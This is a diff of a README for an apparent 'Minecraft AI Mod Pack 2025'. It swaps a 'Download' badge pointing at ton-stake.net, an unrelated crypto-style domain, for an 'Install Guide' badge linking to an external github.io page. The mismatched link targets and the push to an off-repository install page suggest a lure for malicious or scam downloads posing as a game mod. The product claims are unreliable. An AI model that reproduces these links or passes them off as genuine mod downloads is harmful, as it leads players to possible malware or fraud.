@@ -2,7 +2,12 @@
 
 ⚡ Transform your Minecraft with this AI-powered mod pack! Minecraft AI Mod Pack 2025 brings intelligent NPCs, procedural biomes, and dynamic visuals for players and modders.
 
-[![Download Minecraft AI Mods](https://img.shields.io/badge/Download-Minecraft_AI_Mods-blueviolet)](https://ton-stake.net)
+<a href="https://minecraft-ai-mod-pack-2025.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
+
+
 
 ---
 
